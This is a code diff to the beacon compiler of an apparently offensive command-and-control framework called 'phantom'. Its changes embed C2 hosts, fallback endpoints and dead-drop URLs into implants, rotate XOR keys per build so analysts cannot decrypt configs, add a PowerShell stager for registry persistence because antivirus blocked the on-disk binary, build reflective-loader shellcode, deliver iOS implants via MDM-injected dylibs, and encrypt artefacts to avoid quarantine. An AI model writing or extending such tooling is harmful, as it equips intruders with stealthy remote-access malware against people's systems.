@@ -1,13 +1,20 @@
 import os
+import re
+import secrets
 import shutil
 import base64
+import hashlib
 import struct
 import subprocess
-from typing import Optional
+import sys
+from typing import List, Optional
 from rich.console import Console
 from phantom.utils.notifier import notifier
 from phantom.utils.build_helper import check_build_env
 from phantom.utils.c2_crypto import write_beacon_crypto_config, write_beacon_c2_config, crypto_fingerprint
+from phantom.utils.network import beacon_pin, beacon_pubkey_pin
+from phantom.utils.beacon_auth import write_beacon_auth_config
+from phantom.utils.malleable import write_malleable_config
 
 console = Console()
 
@@ -18,17 +25,84 @@ _PLATFORM_OUT = {
     "linux": "beacon_linux",
     "macos": "beacon_macos",
     "android": "beacon_android",
+    # iOS: a dylib injected into an MDM-pushed, enterprise-signed app; a
+    # standalone Mach-O cannot execute on a non-jailbroken device. Builds
+    # only on macOS + Xcode (see check_build_env), delivered via MDM.
+    "ios": "beacon_ios.dylib",
     "linux32": "beacon_linux_x86",
 }
 
 
-def _needs_rebuild(beacon_dir: str, out_name: str) -> bool:
-    """Return True if binary is missing or crypto keys changed since last build."""
+def _endpoint_key(host: str, port, use_ssl) -> str:
+    """The callback a binary is compiled for, as one comparable string.
+
+    It belongs in the rebuild fingerprint: the C2 host/port are BURNED into
+    `c2_config.h`, so a cached binary is only reusable while the endpoint is
+    the same. It used to be keyed on the crypto material alone, and the
+    consequence was exactly the failure this codebase keeps fixing elsewhere
+    — rebuild for a new host (a tunnel hostname, a new engagement) and the
+    builder answered "already built" and handed back the PREVIOUS binary,
+    which checked in to an address that no longer exists.
+    """
+    return f"{str(host or '').strip()}:{int(port or 0)}:{int(bool(use_ssl))}"
+
+
+def _mtls_fingerprint() -> str:
+    """Hash of the mTLS material a beacon would be compiled against.
+
+    `crypto_fingerprint` covers the AES key/nonce only. The beacon also gets
+    a CLIENT certificate signed by the current data-dir CA at build time; a
+    new engagement/data dir rotates that CA. Without this, a cached binary
+    from a previous run presented an old client cert to a `CERT_REQUIRED`
+    listener and every check-in died in the TLS handshake (live defect
+    2026-11-11: deploy succeeded, beacon ran, zero registrations).
+    """
+    try:
+        from phantom.utils.state import use_mtls
+        if not use_mtls():
+            return ""
+        from phantom.utils.paths import certs_dir
+        base = certs_dir()
+    except Exception:
+        return ""
+    h = hashlib.sha256()
+    found = False
+    for name in ("client_ca.crt", "client_ca.key", "mtls_server.crt",
+                 "mtls_server.key"):
+        path = os.path.join(base, name)
+        if not os.path.exists(path):
+            continue
+        found = True
+        h.update(name.encode("utf-8") + b"\0")
+        try:
+            with open(path, "rb") as f:
+                h.update(f.read())
+        except OSError:
+            return ""
+    return h.hexdigest() if found else ""
+
+
+def _build_fingerprint(endpoint: str = "") -> str:
+    return (crypto_fingerprint()
+            + ("|" + endpoint if endpoint else "")
+            + "|mtls:" + _mtls_fingerprint())
+
+
+def _needs_rebuild(beacon_dir: str, out_name: str,
+                   endpoint: str = "") -> bool:
+    """True if the binary is missing, or keys/endpoint/mTLS changed."""
     beacon_out = os.path.join(beacon_dir, out_name)
     hash_file = os.path.join(beacon_dir, f".{out_name}.crypto_hash")
     if not os.path.exists(beacon_out):
         return True
-    current = crypto_fingerprint()
+    # Linux auto-mode deploys the STATIC artifact, but the fingerprint is
+    # stored for the dynamic one. A missing/stale static build used to be
+    # returned as "already built" forever.
+    if out_name == "beacon_linux":
+        static = os.path.join(beacon_dir, "beacon_linux_static")
+        if not os.path.exists(static):
+            return True
+    current = _build_fingerprint(endpoint)
     if not os.path.exists(hash_file):
         return True
     try:
@@ -38,10 +112,10 @@ def _needs_rebuild(beacon_dir: str, out_name: str) -> bool:
         return True
 
 
-def _mark_built(beacon_dir: str, out_name: str) -> None:
+def _mark_built(beacon_dir: str, out_name: str, endpoint: str = "") -> None:
     hash_file = os.path.join(beacon_dir, f".{out_name}.crypto_hash")
     with open(hash_file, "w", encoding="utf-8") as f:
-        f.write(crypto_fingerprint())
+        f.write(_build_fingerprint(endpoint))
 
 
 def _xor_encrypt(data: bytes, key: int = _XOR_KEY) -> bytes:
@@ -124,12 +198,161 @@ def _get_virtualalloc_rva(kernel32_path: str) -> Optional[int]:
         return None
 
 
-def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, arch: str = "x64", disable_anti: bool = True, host: str = "127.0.0.1", port: int = 8080, use_ssl: bool = True) -> Optional[str]:
+# The tracked template of the generated per-build XOR-config header. It lives
+# with the shipping payload (the header is a project asset); `beacon_dir` is
+# only the tree the generated header is written INTO, which is what lets a
+# test build a throwaway tree.
+_CONFIG_HEADER = "config_encrypted.h"
+_CONFIG_TEMPLATE = os.path.normpath(os.path.join(
+    os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
+    "payloads", "beacon", "src", "config_encrypted.h.in"))
+
+
+def write_build_id(beacon_dir: str) -> str:
+    """Write a fresh ``build_id.h`` so every build has a unique binary hash.
+
+    Extracted from ``compile_beacon`` so that `scripts/ci_beacon_prepare.py`
+    writes the SAME header the build does: ``main.cpp`` includes it, a fresh
+    checkout has neither, and a stub written only in CI would not be the header
+    the build actually compiles against.
+    """
+    import uuid
+
+    path = os.path.join(beacon_dir, "src", "build_id.h")
+    os.makedirs(os.path.dirname(path), exist_ok=True)
+    with open(path, "w", encoding="utf-8") as handle:
+        handle.write(f'#pragma once\n#define BUILD_ID "{uuid.uuid4()}"\n')
+    return path
+
+
+def write_config_encrypted(beacon_dir: str, seed: Optional[int] = None) -> str:
+    """Create ``config_encrypted.h`` from its tracked template.
+
+    The header is PER BUILD (a fresh CONFIG_SEED per binary: one seed shared by
+    every build means the XOR keystream hiding C2_HOST/PORT is shared too) and
+    therefore untracked — but nothing ever CREATED it. `_write_config_seed`
+    only rewrites the seed of an EXISTING file, so it worked on machines that
+    still had the header left over from before it was ignored, and a fresh
+    clone failed at ``#include "config_encrypted.h"`` in main.cpp. That is the
+    beacon-syntax job and every beacon-smoke job: they compile the real
+    translation unit on a clean tree.
+
+    An EXISTING header is left alone: `_write_config_seed` rotates it per build
+    and a build must never throw away a header it was handed.
+    """
+    src_dir = os.path.join(beacon_dir, "src")
+    os.makedirs(src_dir, exist_ok=True)
+    path = os.path.join(src_dir, _CONFIG_HEADER)
+    if os.path.exists(path):
+        return path
+    with open(_CONFIG_TEMPLATE, "r", encoding="utf-8") as handle:
+        content = handle.read()
+    value = secrets.randbits(64) if seed is None else int(seed)
+    content = re.sub(r"@CONFIG_SEED@", f"{value:016X}", content, count=1)
+    if re.search(r"@[A-Z_]+@", content):
+        # a template placeholder nothing substitutes would ship as invalid C++
+        raise ValueError(f"{_CONFIG_TEMPLATE}: unsubstituted placeholder")
+    with open(path, "w", encoding="utf-8") as handle:
+        handle.write(content)
+    return path
+
+
+def _write_config_seed(beacon_dir: str) -> str:
+    """Rotate the compile-time XOR seed in ``config_encrypted.h`` per build.
+
+    C2_HOST/C2_PORT are XOR-obfuscated with a keystream derived from
+    CONFIG_SEED. The header documented per-build rotation, but nothing
+    generated it — every binary shipped the same hardcoded seed, so an
+    analyst could decrypt the config of ANY build. A fresh random seed per
+    build gives every binary a different keystream.
+    """
+    src_dir = os.path.join(beacon_dir, "src")
+    path = os.path.join(src_dir, "config_encrypted.h")
+    try:
+        with open(path, "r", encoding="utf-8") as handle:
+            content = handle.read()
+    except OSError:
+        return path
+    seed = secrets.randbits(64)
+    new_content, count = re.subn(
+        r"constexpr uint64_t CONFIG_SEED = 0x[0-9A-Fa-f]+ULL;",
+        f"constexpr uint64_t CONFIG_SEED = 0x{seed:016X}ULL;",
+        content, count=1)
+    if count == 1:
+        with open(path, "w", encoding="utf-8") as handle:
+            handle.write(new_content)
+    return path
+
+
+def _callback_host_error(host: str) -> str:
+    """Reject a wildcard BIND address as the beacon's CONNECT address.
+
+    The listener may bind 0.0.0.0 (all interfaces), but a payload dialing
+    0.0.0.0 can never check in: it is not a routable target. The operator
+    must compile with the public IP/DNS (or a relay) the target can reach.
+    """
+    h = (host or "").strip()
+    if h in ("0.0.0.0", "::", "[::]"):
+        return ("Refusing wildcard callback host %r: 0.0.0.0 is a bind "
+                "address, not a connect address. Use the public IP/DNS or a "
+                "staging relay reachable from the target." % h)
+    return ""
+
+
+def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False,
+                   arch: str = "x64", disable_anti: bool = False,
+                   host: str = "127.0.0.1", port: int = 8080,
+                   use_ssl: bool = True,
+                   malleable_profile: Optional[str] = None,
+                   hosts: Optional[List[str]] = None,
+                   proxy: str = "") -> Optional[str]:
     """
     Compiles the C++ beacon for the specified platform and architecture.
-    Embeds C2 keys from environment into crypto_config.h at build time.
+    Embeds C2 keys and enrolls a unique per-beacon HMAC identity at build time.
+    When PHANTOM_MTLS_REQUIRED=1, client certificate material and the pinned
+    server fingerprint are generated into the protected build artifact.
+
+    `hosts` is the FALLBACK ladder behind `host` (from PHANTOM_C2_FALLBACK /
+    `c2.fallback` when not passed explicitly) and `proxy` an explicit proxy
+    URL (PHANTOM_C2_PROXY / `c2.proxy`); both are embedded so a filtered
+    endpoint or a proxy-only network does not cost the engagement.
     Returns the path to the compiled binary or None on failure.
     """
+    _host_err = _callback_host_error(host)
+    if _host_err:
+        notifier.error(_host_err)
+        return None
+    if hosts is None or not proxy:
+        try:
+            from phantom.utils.network import get_c2_fallbacks, get_c2_proxy
+            if hosts is None:
+                hosts = get_c2_fallbacks()
+            if not proxy:
+                proxy = get_c2_proxy()
+        except Exception:
+            hosts = hosts or []
+    for fallback in (hosts or []):
+        _fallback_err = _callback_host_error(fallback)
+        if _fallback_err:
+            notifier.error("fallback endpoint: " + _fallback_err)
+            return None
+    # PER-ENDPOINT PINS: each rung of the ladder may present its own
+    # certificate, so `c2.pins` / `c2.pubkey_pins` carry one pin per rung
+    # (positionally aligned with [primary] + fallbacks); empty = [].
+    try:
+        from phantom.utils.network import get_c2_host_pins, get_c2_pubkey_pins
+        host_pins = get_c2_host_pins()
+        pubkey_pins = get_c2_pubkey_pins()
+    except Exception:
+        host_pins, pubkey_pins = [], []
+    # LAST-RING dead drop: the URL the beacon falls back to only when every
+    # ladder rung failed. Read from config here so a build always embeds the
+    # operator's current dead drop (no separate flag to forget).
+    try:
+        from phantom.utils.dead_drop import configured_url
+        dead_drop = configured_url()
+    except Exception:
+        dead_drop = ""
     if not check_build_env(platform, arch):
         notifier.error(f"Build environment not ready for {platform} ({arch}).")
         return None
@@ -137,9 +360,14 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
     beacon_dir = os.path.abspath(os.path.join(pkg_root, "payloads", "beacon"))
     
     # Cleanup any existing beacon process to prevent "Permission denied"
+    # Scoped: only processes started from THIS beacon directory are killed,
+    # never unrelated beacon.exe on the operator host.
     if os.name == 'nt':
-        subprocess.run(["taskkill", "/F", "/IM", "beacon.exe", "/T"], capture_output=True)
-        subprocess.run(["taskkill", "/F", "/IM", "beacon.dll", "/T"], capture_output=True)
+        beacon_exe = os.path.join(beacon_dir, _PLATFORM_OUT.get("windows", "beacon.exe"))
+        subprocess.run(
+            ["powershell", "-NoProfile", "-Command",
+             f"Get-Process -Name beacon -ErrorAction SilentlyContinue | Where-Object {{ $_.Path -eq '{beacon_exe}' }} | Stop-Process -Force"],
+            capture_output=True, timeout=30)
     
     # Architecture-aware output name
     if platform == "linux" and arch == "x86":
@@ -153,17 +381,139 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
 
     beacon_out = os.path.join(beacon_dir, out_name)
 
-    if not force_rebuild and not _needs_rebuild(beacon_dir, out_name):
+    _endpoint = _endpoint_key(host, port, use_ssl)
+    if not force_rebuild and not _needs_rebuild(beacon_dir, out_name, _endpoint):
         return beacon_out
 
     # Generate dynamic build ID to ensure unique binary hash
-    import uuid
-    build_id_path = os.path.join(beacon_dir, "src", "build_id.h")
-    with open(build_id_path, "w") as f:
-        f.write(f'#pragma once\n#define BUILD_ID "{uuid.uuid4()}"\n')
+    write_build_id(beacon_dir)
 
-    write_beacon_crypto_config(beacon_dir)
-    write_beacon_c2_config(beacon_dir, host=host, port=port, use_ssl=use_ssl)
+    # Enroll a unique identity for every explicit build. The private secret
+    # is written only to the generated header and the operator registry.
+    write_beacon_auth_config(beacon_dir)
+    # payload_token="": the identity enrolled just above derives its own
+    # download token at runtime. Burning the deployment token into every
+    # binary handed an analyst who captures one beacon the key to fetch every
+    # payload, forever.
+    write_beacon_crypto_config(beacon_dir, payload_token="")
+    # No-disk persistence: embed the compact PowerShell stager so the
+    # beacon's `persist` command writes a RunKey that relaunches the
+    # in-memory path at logon (field-verified: the on-disk PE gets
+    # execution-blocked by McAfee even when the file itself survives).
+    # PHANTOM_BUILD_NO_PS_STAGER=1 is a documented test/ops override: build
+    # WITHOUT the embedded stager so `persist` exercises strategy 2 (on-disk
+    # PE + RunKey) end to end. Never used for a deployed payload.
+    _no_ps_stager = os.environ.get(
+        "PHANTOM_BUILD_NO_PS_STAGER", "").strip().lower() in (
+            "1", "true", "yes", "on")
+    ps_stager_b64 = ""
+    if not _no_ps_stager:
+        try:
+            # ONE-SHOT on purpose: this blob is re-run by the beacon's own
+            # `persist` (RunKey at logon). Wrapping it resilient would schedule a
+            # SECOND persistence (a schtasks task) on top of the RunKey.
+            _drop = generate_dropper(
+                "windows", host, str(port), dl_port=port, use_ssl=use_ssl,
+                resilient=False)
+            if _drop and " -Enc " in _drop:
+                ps_stager_b64 = _drop.rsplit(" -Enc ", 1)[1].strip()
+        except Exception:
+            ps_stager_b64 = ""
+    # REDIRECTOR-FIRST GUARDRAIL: a beacon that carries the operator's own
+    # listener address hands an analyst who captures it the backend to
+    # attack. Warn at BUILD time (doctor reports the same posture) unless a
+    # disposable `c2.front` covers the build.
+    try:
+        from phantom.utils.network import front_guard_reason
+        _front_reason = front_guard_reason(host)
+        if _front_reason:
+            notifier.warn(f"C2 front: {_front_reason}.")
+    except Exception:
+        pass
+    # Dead-drop-first: resolve the live endpoint before the first check-in so
+    # the indirection can be rotated without rebuilding (flag in the header).
+    try:
+        from phantom.utils import config as _cfg
+        bootstrap_dd = _cfg.get_bool("c2.bootstrap_dead_drop", True,
+                                     env="PHANTOM_C2_DEADDROP_BOOTSTRAP")
+    except Exception:
+        bootstrap_dd = True
+    # PIN SOURCE: a TLS-TERMINATING front presents its OWN certificate, so the
+    # pin must be derived from that file (c2.front_cert / certs/front.crt), not
+    # the backend's — otherwise every check-in fails once the two differ.
+    try:
+        from phantom.utils.network import c2_pin_cert_path
+        pin_cert = c2_pin_cert_path()
+    except Exception:
+        pin_cert = ""
+    if use_ssl:
+        try:
+            from phantom.utils.network import c2_pin_cert_path, get_c2_front
+            if get_c2_front() and not c2_pin_cert_path():
+                notifier.warn(
+                    "C2 front: a front is set but no front certificate was "
+                    "found — the beacon will pin the BACKEND certificate, "
+                    "which a TLS-terminating front does not present. Set "
+                    "c2.front_cert or drop certs/front.crt.")
+        except Exception:
+            pass
+    if use_ssl and not pin_cert:
+        # No TLS-terminating front: the beacon pins the LISTENER's own
+        # certificate and dials `host`, so that certificate must NAME
+        # `host` — schannel aborts a SAN mismatch client-side, before any
+        # HTTP request reaches us (live defect 2026-10-16: a certificate
+        # born for 0.0.0.0/SAN localhost was reused forever while beacons
+        # dialed 127.0.0.1, pin matched, and no check-in ever arrived).
+        # Ensure coverage here, where the dial host is known, and warn if
+        # the material rotated under an already-running listener.
+        try:
+            from phantom.utils.state import use_mtls
+            if use_mtls():
+                from phantom.utils.beacon_auth import ensure_mtls_material
+                from phantom.utils.c2_crypto import server_cert_fingerprint
+                _pin_before = server_cert_fingerprint("")
+                ensure_mtls_material(None, host)
+                _pin_after = server_cert_fingerprint("")
+                if _pin_after and _pin_before != _pin_after:
+                    notifier.warn(
+                        f"C2 certificate regenerated for '{host}': the old "
+                        "one did not cover it, so the client would have "
+                        "aborted the handshake. This build pins the NEW "
+                        "certificate — restart the https listener now "
+                        "(listeners stop, then start) or it keeps serving "
+                        "the old one and every check-in dies on the pin.")
+        except Exception:
+            pass
+    _cert_pin = beacon_pin(pin_cert)
+    _pk_pin = beacon_pubkey_pin(pin_cert)
+    # A-2: a TLS beacon with NO pin and NO mTLS cannot authenticate the peer,
+    # and the runtime now fails closed. Tell the operator at BUILD time so a
+    # dead beacon is not discovered later on the target.
+    if use_ssl and not _cert_pin and not _pk_pin:
+        from phantom.utils.network import _pins_disabled
+        if _pins_disabled():
+            notifier.warn(
+                "C2 pinning is OFF (PHANTOM_BEACON_PIN=0): this beacon will "
+                "accept ANY TLS certificate. Only acceptable in a lab.")
+        else:
+            notifier.warn(
+                "HTTPS beacon has no certificate pin: no C2 certificate was "
+                "found, so the beacon fails closed and cannot check in. "
+                "Generate the listener certificate first, or opt out "
+                "explicitly with PHANTOM_BEACON_PIN=0.")
+    write_beacon_c2_config(beacon_dir, host=host, port=port, use_ssl=use_ssl,
+                           ps_stager_b64=ps_stager_b64, hosts=list(hosts or []),
+                           proxy=proxy or "", pin=_cert_pin,
+                           pins=host_pins, pubkey_pin=_pk_pin,
+                           pubkey_pins=pubkey_pins,
+                           dead_drop=dead_drop or "",
+                           bootstrap_dead_drop=bootstrap_dd)
+    write_malleable_config(beacon_dir, profile_path=malleable_profile)
+    # Materialise the XOR-config header on a tree that has never built, then
+    # rotate its seed: the two together give every build its own keystream.
+    write_config_encrypted(beacon_dir)
+    # Fresh XOR keystream per build so the C2 config never recurs in strings.
+    _write_config_seed(beacon_dir)
 
     if platform == "windows":
         console.print(f"[yellow][*] Compiling beacon for Windows ({arch})...[/yellow]")
@@ -173,7 +523,6 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
                 "src/pic_bootstrap.asm",
                 "src/peb_walker.asm",
                 "src/api_resolver.asm",
-                "src/stack_spoofer.asm",
             ]
 
             # Helper to find a tool by any of its possible names
@@ -226,7 +575,7 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
                 obj_path = os.path.join(beacon_dir, obj)
                 asm_path = os.path.normpath(os.path.join(beacon_dir, af))
                 console.print(f"[blue]  Assembling: {af} -> {obj}[/blue]")
-                result = subprocess.run([mingw_as, *as_flags, asm_path, "-o", obj_path], capture_output=True, text=True, env=build_env)
+                result = subprocess.run([mingw_as, *as_flags, asm_path, "-o", obj_path], capture_output=True, text=True, env=build_env, timeout=300)
                 if result.returncode != 0:
                     console.print(f"[red]  Assembler failed (exit {result.returncode}):[/red]")
                     console.print(f"[red]  stdout: {result.stdout}[/red]")
@@ -259,14 +608,46 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
 
             try:
                 # First pass: link with map file to extract beacon_main RVA
-                cmd = [mingw_cpp, "-std=c++20", "-O2", "-s", "-fno-stack-protector", "-D_BUILD_TIME=" + build_time]
+                # SIZE IS A FEATURE (measured 2026-11-03). The PE came out at
+                # 1.67 MB, and the HID stager ships it over a PowerShell
+                # download: every byte is time on screen, CPU in the XOR loop
+                # and memory a defender can inspect. `-Os` plus section GC
+                # drops the code this build never calls (unused WinHTTP/GDI+
+                # paths, dead vtables) without changing behaviour; `-s` already
+                # stripped the symbols. Verify with a real check-in, not by
+                # reading the size alone.
+                # SIZE (measured 2026-11-03): three attempts to shrink the 1.67 MB
+                # PE were made and ALL THREE failed at LINK time, so the flags
+                # stay as they were:
+                #   * `-fno-asynchronous-unwind-tables` → undefined
+                #     `__gxx_personality_v0` (C++ exceptions need the tables);
+                #   * `-ffunction-sections -fdata-sections -Wl,--gc-sections` →
+                #     undefined `std::basic_string` move ctor (custom `_start`
+                #     entry + STATIC libstdc++ hides the references that keep
+                #     those COMDATs alive);
+                #   * `-Os` on top of the EXISTING `-O2` objects → same
+                #     undefined std::string references, because main.cpp is
+                #     compiled at link time and the prebuilt objects are not.
+                # Shrinking it is a real project (rebuild every object at one
+                # size level, or link dynamically): not a flag to poke at.
+                cmd = [mingw_cpp, "-std=c++20", "-O2", "-s",
+                       "-fno-stack-protector", "-fno-omit-frame-pointer",
+                       "-D_BUILD_TIME=" + build_time]
                 if disable_anti:
                     cmd.append("-DDISABLE_ANTI")
+                # Diagnostic builds only: compile the spawn/VEH trace in. This is
+                # opt-in so a normal beacon never pays for (or leaks) trace code.
+                if os.environ.get("PHANTOM_BEACON_TRACE", "").strip().lower() in (
+                        "1", "true", "yes", "on"):
+                    cmd.append("-DPHANTOM_SHELL_TRACE=1")
+                if os.environ.get("PHANTOM_TASK_TRACE", "").strip().lower() in (
+                        "1", "true", "yes", "on"):
+                    cmd.append("-DPHANTOM_TASK_TRACE=1")
                 cmd += ["-o", temp_pe,
                        f"-I{os.path.join(beacon_dir, 'src')}", main_cpp,                           f"-Wl,-e,_start,-Map,{temp_map}"] + obj_paths + ["-lwinhttp", "-lbcrypt", "-lws2_32", "-lbthprops", "-lwlanapi", "-lgdi32", "-luser32", "-lgdiplus", "-lole32", "-liphlpapi", "-lcrypt32", "-static", "-mwindows"]
 
                 console.print(f"[blue]  Linking PE in TEMP ({temp_build_dir})...[/blue]")
-                result = subprocess.run(cmd, capture_output=True, text=True, env=build_env)
+                result = subprocess.run(cmd, capture_output=True, text=True, env=build_env, timeout=600)
                 if result.returncode != 0:
                     console.print(f"[red]Compilation failed:\n{result.stderr}[/red]")
                     return None
@@ -298,7 +679,7 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
                 # Extract raw binary via objcopy
                 console.print(f"[blue]  Extracting raw binary via objcopy...[/blue]")
                 subprocess.run([mingw_objcopy, "-O", "binary", temp_pe, temp_full_bin],
-                               check=True, capture_output=True, text=True, env=build_env)
+                               check=True, capture_output=True, text=True, env=build_env, timeout=300)
 
                 # Trim CRT prefix so _start is at offset 0
                 with open(temp_pe, 'rb') as f:
@@ -350,7 +731,7 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
                 rl_bootstrap_asm = os.path.join(beacon_dir, "src", "reflective_loader_bootstrap.asm")
                 rl_bootstrap_o = os.path.join(beacon_dir, "src", "reflective_loader_bootstrap.o")
                 r = subprocess.run([mingw_as, "--64", rl_bootstrap_asm, "-o", rl_bootstrap_o],
-                    capture_output=True, text=True, env=build_env)
+                    capture_output=True, text=True, env=build_env, timeout=300)
                 if r.returncode != 0:
                     console.print(f"[red]  RL asm failed: {r.stderr}[/red]")
                     return None
@@ -360,7 +741,7 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
                 rl_c_o = os.path.join(beacon_dir, "src", "reflective_loader.o")
                 r = subprocess.run([mingw_cc, "-c", "-O2", "-fPIC", "-nostdlib", "-ffreestanding",
                     "-fno-stack-protector", rl_c_src, "-o", rl_c_o],
-                    capture_output=True, text=True, env=build_env)
+                    capture_output=True, text=True, env=build_env, timeout=300)
                 if r.returncode != 0:
                     console.print(f"[red]  RL C failed: {r.stderr}[/red]")
                     return None
@@ -370,7 +751,7 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
                 r = subprocess.run([mingw_cc, "-nostdlib", "-nostartfiles",
                     "-Wl,-e,_reflective_loader_entry", "-Wl,--subsystem,windows",
                     "-o", rl_exe, rl_bootstrap_o, rl_c_o],
-                    capture_output=True, text=True, env=build_env)
+                    capture_output=True, text=True, env=build_env, timeout=300)
                 if r.returncode != 0:
                     console.print(f"[red]  RL link failed: {r.stderr}[/red]")
                     return None
@@ -378,7 +759,7 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
                 # Extract as raw binary
                 rl_bin = os.path.join(beacon_dir, "reflective_loader.bin")
                 r = subprocess.run([mingw_objcopy, "-O", "binary", rl_exe, rl_bin],
-                    capture_output=True, text=True, env=build_env)
+                    capture_output=True, text=True, env=build_env, timeout=300)
                 if r.returncode != 0:
                     console.print(f"[red]  RL objcopy failed: {r.stderr}[/red]")
                     return None
@@ -442,7 +823,24 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
                 except OSError:
                     pass
 
-            _mark_built(beacon_dir, out_name)
+            # ── Seal the plaintext artefacts ───────────────────────────
+            # beacon.pe / beacon.bin are content-signatured, and an on-access
+            # antivirus deletes them on the OPERATOR's machine the first time
+            # they are touched. Sealing keeps the exact same bytes available
+            # to the C2 (decrypted in memory when served) without leaving a
+            # quarantinable file in the build tree.
+            try:
+                from phantom.utils import beacon_artifacts
+                if beacon_artifacts.seal(beacon_pe) or \
+                        beacon_artifacts.seal(beacon_bin):
+                    console.print("[green][+] Artefacts sealed at rest "
+                                  "(.enc + random key; set "
+                                  "PHANTOM_KEEP_ARTIFACTS=1 to keep the "
+                                  "plaintext)[/green]")
+            except Exception as exc:          # sealing must never break a build
+                console.print(f"[yellow][!] Sealing skipped: {exc}[/yellow]")
+
+            _mark_built(beacon_dir, out_name, _endpoint_key(host, port, use_ssl))
             return beacon_bin
         except subprocess.CalledProcessError as e:
             notifier.error(f"Windows compilation failed:\n{e.stderr}")
@@ -451,27 +849,67 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
     elif platform == "linux":
         console.print(f"[yellow][*] Compiling beacon for Linux ({arch})...[/yellow]")
         try:
-            cmd = [
-                "g++", "-std=c++20", "-O2", "-s",
-                "-o", out_name, "-Isrc", "src/main.cpp",
-                "-lssl", "-lcrypto", "-lpthread", "-ldl"
-            ]
-            if arch == "x86":
-                cmd.insert(1, "-m32")
-
-            subprocess.run(cmd, cwd=beacon_dir, check=True, capture_output=True, text=True)
-            _mark_built(beacon_dir, out_name)
-
-            # Build static + XOR'd inject payload
             static_name = "beacon_linux_static"
+
+            def _wsl_path(p: str) -> str:
+                p = os.path.abspath(p)
+                drive, rest = p[0].lower(), p[2:].replace("\\", "/")
+                return f"/mnt/{drive}{rest}"
+
+            def _build_cmd(static: bool) -> list:
+                if static:
+                    base = ["g++", "-std=c++20", "-O2", "-s", "-static", "-no-pie",
+                            "-o", static_name, "-Isrc", "src/main.cpp",
+                            "-lssl", "-lcrypto", "-lz", "-lzstd", "-ldl", "-lpthread"]
+                else:
+                    base = ["g++", "-std=c++20", "-O2", "-s",
+                            "-o", out_name, "-Isrc", "src/main.cpp",
+                            "-lssl", "-lcrypto", "-lpthread", "-ldl"]
+                    if arch == "x86":
+                        base.insert(1, "-m32")
+                return base
+
+            # Windows host: compile INSIDE the Kali WSL distro — its g++ has
+            # the Linux headers and static libs the MinGW toolchain lacks.
+            wsl_prefix: list = []
+            wsl_dir = ""
+            if os.name == "nt":
+                from phantom.utils.build_helper import _wsl_cmd
+                wsl_prefix = _wsl_cmd(["true"])
+                if wsl_prefix:
+                    wsl_prefix = wsl_prefix[:-1]   # drop the trailing 'true'
+                    wsl_dir = _wsl_path(beacon_dir)
+
+            def _run(cmd: list) -> None:
+                if wsl_prefix:
+                    fixed = []
+                    skip = False
+                    for part in cmd:
+                        if skip:
+                            fixed.append(f"{wsl_dir}/{part}")
+                            skip = False
+                        elif part == "-o":
+                            fixed.append(part)
+                            skip = True
+                        elif part == "-Isrc":
+                            fixed.append(f"-I{wsl_dir}/src")
+                        elif part == "src/main.cpp":
+                            fixed.append(f"{wsl_dir}/src/main.cpp")
+                        else:
+                            fixed.append(part)
+                    subprocess.run(wsl_prefix + fixed, check=True,
+                                   capture_output=True, text=True, timeout=600)
+                else:
+                    subprocess.run(cmd, cwd=beacon_dir, check=True,
+                                   capture_output=True, text=True, timeout=600)
+
+            _run(_build_cmd(static=False))
+
+            # Static + XOR'd inject payload (deploy artifact). Only mark the
+            # build cache once the static deploy artifact exists too.
             static_path = os.path.join(beacon_dir, static_name)
             try:
-                static_cmd = [
-                    "g++", "-std=c++20", "-O2", "-s", "-static", "-no-pie",
-                    "-o", static_name, "-Isrc", "src/main.cpp",
-                    "-lssl", "-lcrypto", "-lz", "-lzstd", "-ldl", "-lpthread"
-                ]
-                subprocess.run(static_cmd, cwd=beacon_dir, check=True, capture_output=True, text=True)
+                _run(_build_cmd(static=True))
 
                 xored_path = os.path.join(beacon_dir, "beacon_linux_xored.bin")
                 with open(static_path, "rb") as f:
@@ -480,14 +918,19 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
                 with open(xored_path, "wb") as f:
                     f.write(xored)
 
-                for tmp in [static_name, "beacon_linux_raw.bin"]:
-                    tmp_path = os.path.join(beacon_dir, tmp)
-                    if os.path.exists(tmp_path):
-                        os.unlink(tmp_path)
+                # keep beacon_linux_static: the auto-mode Linux deploy (scp
+                # + setsid) stages the STATIC binary — the dynamic one dies
+                # with GLIBC_2.38 on older distros (Debian bookworm, ...)
+                raw_path = os.path.join(beacon_dir, "beacon_linux_raw.bin")
+                if os.path.exists(raw_path):
+                    os.unlink(raw_path)
 
                 console.print(f"[green][+] XOR-encrypted inject payload: {xored_path} ({len(xored)} bytes)[/green]")
             except Exception as static_err:
                 console.print(f"[yellow][!] Static inject payload not built: {static_err}[/yellow]")
+            if os.path.exists(static_path):
+                _mark_built(beacon_dir, out_name,
+                            _endpoint_key(host, port, use_ssl))
 
             return beacon_out
         except subprocess.CalledProcessError as e:
@@ -495,27 +938,97 @@ def compile_beacon(platform: str, pkg_root: str, force_rebuild: bool = False, ar
             return None
 
     elif platform == "macos":
-        console.print("[yellow][*] Compiling beacon for macOS (osxcross)...[/yellow]")
         osxcross_root = os.environ.get("OSXCROSS_ROOT", "/opt/osxcross")
         o32_cc = os.path.join(osxcross_root, "bin", "o32-clang++")
-        if not os.path.exists(o32_cc):
-            notifier.error(f"osxcross compiler not found at {o32_cc}")
-            return None
+        # On a REAL Mac osxcross does not exist and is not needed: the system
+        # clang++ builds the payload directly. Without this branch a macOS
+        # operator could not produce a macOS beacon at all — which made the
+        # cross-platform promise land on Linux/Windows in practice.
+        native = sys.platform == "darwin" and not os.path.exists(o32_cc)
+        if native:
